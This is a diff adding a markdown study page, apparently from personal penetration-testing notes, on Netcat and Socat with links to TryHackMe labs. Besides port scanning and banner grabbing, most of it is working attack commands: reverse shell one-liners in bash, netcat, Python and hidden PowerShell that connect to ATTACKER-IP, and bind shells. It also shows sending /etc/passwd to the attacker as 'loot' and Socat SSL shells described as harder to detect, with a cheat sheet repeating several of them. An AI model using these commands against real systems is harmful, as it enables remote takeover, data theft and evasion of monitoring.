@@ -1,0 +1,279 @@
+---
+layout: default
+title: Netcat and Socat
+---
+
+# Netcat and Socat
+
+## What is Netcat
+
+Netcat (nc) is a networking utility for reading and writing data across TCP and UDP connections. It is called the "Swiss Army knife" of networking. Security professionals use it for port scanning, transferring files, creating shells, and setting up listeners.
+
+---
+
+## Installation
+
+```bash
+# Most Linux distros
+sudo apt install netcat-openbsd
+
+# Check version
+nc -h
+```
+
+---
+
+## Basic Connection
+
+### Connect to a port (like telnet)
+
+```bash
+nc 192.168.1.1 80
+```
+
+After connecting, type an HTTP request:
+GET / HTTP/1.1
+
+Host: 192.168.1.1
+(Press Enter twice)
+
+### Listen on a port
+
+```bash
+nc -lvnp 4444
+```
+
+| Flag | Meaning |
+|------|---------|
+| `-l` | Listen mode |
+| `-v` | Verbose |
+| `-n` | No DNS resolution |
+| `-p` | Port number |
+
+---
+
+## Netcat for Shells
+
+### Reverse Shell
+
+Target connects back to attacker. Attacker runs listener first.
+
+**Attacker (listener):**
+```bash
+nc -lvnp 4444
+```
+
+**Target (victim machine — various options):**
+
+Bash:
+```bash
+bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
+```
+
+Netcat (if `-e` is available):
+```bash
+nc ATTACKER-IP 4444 -e /bin/bash
+```
+
+Python:
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+PowerShell (Windows):
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER-IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+### Bind Shell
+
+Attacker connects TO the target. Target listens first.
+
+**Target (listens):**
+```bash
+nc -lvnp 4444 -e /bin/bash
+```
+
+**Attacker (connects):**
+```bash
+nc TARGET-IP 4444
+```
+
+---
+
+## Upgrading a Dumb Shell to a Full TTY
+
+When you get a reverse shell it is often unstable. Upgrade it:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+Now you have arrow keys, tab completion, and Ctrl+C works properly.
+
+---
+
+## File Transfer with Netcat
+
+### Send file from attacker to target
+
+**Receiver (target):**
+```bash
+nc -lvnp 4444 > received_file.txt
+```
+
+**Sender (attacker):**
+```bash
+nc TARGET-IP 4444 < file_to_send.txt
+```
+
+### Send file from target to attacker
+
+**Receiver (attacker):**
+```bash
+nc -lvnp 4444 > loot.txt
+```
+
+**Sender (target):**
+```bash
+nc ATTACKER-IP 4444 < /etc/passwd
+```
+
+---
+
+## Port Scanning with Netcat
+
+```bash
+# Scan a range of ports
+nc -zv 192.168.1.1 1-1000
+
+# Check a single port
+nc -zv 192.168.1.1 22
+```
+
+| Flag | Meaning |
+|------|---------|
+| `-z` | Zero I/O mode — just scan, don't send data |
+| `-v` | Show results |
+
+---
+
+## Banner Grabbing
+
+```bash
+nc -nv 192.168.1.1 22
+nc -nv 192.168.1.1 80
+nc -nv 192.168.1.1 25
+```
+
+Connect and the service usually announces itself — reveals software and version.
+
+---
+
+## What is Socat
+
+Socat is a more powerful version of Netcat. It can create encrypted connections, handle multiple protocols, and create fully interactive shells.
+
+```bash
+sudo apt install socat
+```
+
+---
+
+## Socat Basic Usage
+
+### Simple listener
+
+```bash
+socat TCP-LISTEN:4444 -
+```
+
+### Connect to a host
+
+```bash
+socat - TCP:192.168.1.1:4444
+```
+
+---
+
+## Socat Fully Interactive Shell
+
+Much more stable than a basic Netcat shell.
+
+**Attacker (listener):**
+```bash
+socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
+```
+
+**Target:**
+```bash
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:ATTACKER-IP:4444
+```
+
+This gives you a fully interactive shell with tab completion, arrow keys, and proper terminal size.
+
+---
+
+## Socat Encrypted Shell (SSL)
+
+**Generate cert on attacker:**
+```bash
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+cat shell.key shell.crt > shell.pem
+```
+
+**Attacker (listener):**
+```bash
+socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 file:`tty`,raw,echo=0
+```
+
+**Target:**
+```bash
+socat OPENSSL:ATTACKER-IP:4444,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
+```
+
+The shell is now encrypted and harder to detect.
+
+---
+
+## Practice Labs
+
+- TryHackMe: What the Shell? room — covers Netcat, Socat, shells in depth
+- TryHackMe: Reverse Shell Cheat Sheet
+- Any exploitation room on TryHackMe or HTB requires a listener
+
+---
+
+## Shell Cheat Sheet Quick Reference
+
+```bash
+# Start listener
+nc -lvnp 4444
+
+# Bash reverse shell
+bash -i >& /dev/tcp/IP/4444 0>&1
+
+# Python reverse shell
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Upgrade shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+Ctrl+Z → stty raw -echo; fg → export TERM=xterm
+```
+
+---
+
+## Key Terms
+
+| Term | Meaning |
+|------|---------|
+| Reverse shell | Target connects back to attacker listener |
+| Bind shell | Attacker connects to listener on target |
+| TTY | Proper interactive terminal |
+| Dumb shell | Basic shell with no tab completion or arrow keys |
+| Socat | Advanced version of Netcat with more features |
+| SSL | Encrypted connection — hides shell traffic |
+| Banner grabbing | Connecting to a port to read the service announcement |
